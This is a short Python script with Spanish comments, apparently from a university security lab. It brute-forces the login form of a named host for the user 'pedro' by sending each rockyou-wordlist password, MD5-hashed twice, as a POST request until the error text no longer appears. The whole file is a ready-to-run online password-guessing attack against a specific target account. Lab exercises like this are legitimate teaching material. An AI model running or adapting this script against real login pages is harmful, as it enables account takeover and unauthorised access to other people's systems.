import requests
import hashlib

# URL del formulario de login
url = 'https://nemeziz.dsa.linti.unlp.edu.ar/login'

# Usuario objetivo
username = 'pedro'

# Ruta al diccionario rockyou.txt
diccionario = './rockyou2k'

def doble_md5(password):
    # Primero codificamos el password, luego aplicamos dos veces md5
    return hashlib.md5(hashlib.md5(password.encode()).hexdigest().encode()).hexdigest()

with open(diccionario, 'r', encoding='latin-1') as f:
    for i, password in enumerate(f):
        password = password.strip()
        hashed_password = doble_md5(password)

        # Enviamos la petición POST con el password hasheado dos veces
        response = requests.post(url, data={
            'username': username,
            'password': hashed_password
        })

        # Si el login fue exitoso, la respuesta no tendrá "incorrectos"
        if "incorrecto" not in response.text:
            print(f"[+] Contraseña encontrada: {password}")
            print(f"[+] Hash doble enviado: {hashed_password}")
            break

        if i % 100 == 0:
            print(f"Probadas {i} contraseñas...")

    else:
        print("[-] Contraseña no encontrada en el diccionario.")
